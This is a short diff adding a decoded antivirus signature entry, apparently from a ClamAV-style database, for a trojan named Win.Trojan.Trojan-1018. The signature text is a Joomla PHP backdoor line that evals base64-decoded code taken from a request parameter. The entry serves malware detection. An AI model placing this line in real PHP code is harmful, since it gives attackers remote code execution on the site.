@@ -1,0 +1,7 @@
+VIRUS NAME: Win.Trojan.Trojan-1018
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+defined( '_JEXEC' ) or die(@eval(base64_decode($_REQUEST['c_id'])));
+jimport( 'joomla.plugin.plugin' );
+jimport( 'joomla.application.component.helper' )
